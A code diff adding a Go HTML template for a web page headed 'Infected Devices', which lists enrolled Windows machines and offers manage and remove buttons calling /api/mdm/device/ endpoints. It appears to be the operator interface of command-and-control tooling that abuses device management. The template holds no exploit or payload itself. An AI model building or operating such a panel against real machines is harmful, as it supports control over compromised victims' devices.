@@ -1,0 +1,72 @@
+{{define "page:title"}}Devices{{end}}
+
+{{define "page:main"}}
+    <div class="col-12">    
+        <li class="nav-item font-weight-semibold d-none d-lg-block ms-0">
+            <h2 class="display-3">Infected Devices</h2>
+        </li>
+        <br>                           
+
+        <div class="card">
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-12">
+                    <script>
+                        function deleteDevice(deviceId) {
+                            var url = '/api/mdm/device/' + deviceId;
+                            
+                            fetch(url, {
+                                method: 'DELETE',
+                            })
+                            .then(() => {
+                                window.location.href = '/';
+                            })
+                            .catch((error) => {
+                                console.error('delete-device error:', error);
+                            });
+                        }  
+
+                        function redirectoToDeviceManagement(deviceId) {
+                            window.location.href = '/mdm/device/' + deviceId;
+                        }
+                    </script>
+                    
+                    <div class="table-responsive">
+                        <table id="order-listing" class="table">
+                        <thead>
+                            <tr class="bg-dark text-white">
+                                <th>Name</th>
+                                <th>DeviceID</th>
+                                <th>Client Version</th>
+                                <th>Windows Version</th>                                
+                                <th>Locale</th>
+                                <th>Enroll Date</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {{ range .Devices }}
+                            <tr>
+                                <td>{{ .Name }}</td>
+                                <td>{{ .ID }}</td>
+                                <td>{{ .ClientVersion }}</td>
+                                <td>{{ .OSVersion }}</td>                               
+                                <td>{{ .OSLocale }}</td>                                
+                                <td>{{ formatTimeRFC822 .CreatedAt }}</td>
+                                <td class="text-right">
+                                    <button class="btn btn-dark" href="javascript:{}" onclick="redirectoToDeviceManagement({{ .ID }});">
+                                        <i class="ti-panel .text-success"></i>Manage</button>
+                                    <button class="btn btn-dark" href="javascript:{}" onclick="deleteDevice({{ .ID }});">
+                                        <i class="ti-close text-danger"></i>Remove</button>
+                                </td>
+                            </tr>
+                            {{ end }}
+                        </tbody>
+                        </table>
+                    </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+{{end}}
